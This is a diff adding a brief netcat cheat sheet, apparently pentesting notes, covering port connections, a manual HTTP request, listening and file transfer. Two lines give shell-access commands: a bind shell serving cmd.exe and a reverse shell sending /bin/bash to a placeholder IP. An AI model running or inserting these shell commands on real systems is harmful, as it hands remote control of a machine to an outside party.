@@ -1,0 +1,16 @@
+### nc ###
+
+
+##############
+## examples ##
+##############
+nc -nv xx.xx.xx.xx 22								# verbose, skip resolv
+nc -nv xx.xx.xx.xx 80								# manual request on webserver
+	GET / HTTP/1.1
+	Host: xx.xx.xx.xx
+nc -lnvp 4444									# listen
+nc -lnvp 4444 > inc.txt								# store to a file
+nc -nv xx.xx.xx.xx 4444 < inc.txt						# send the file
+nc -nlvp 4444 -e cmd.exe							# listen and offer cmd.exe
+nc -nv xx.xx.xx.xx 4444 -e /bin/bash						# send a bash
+
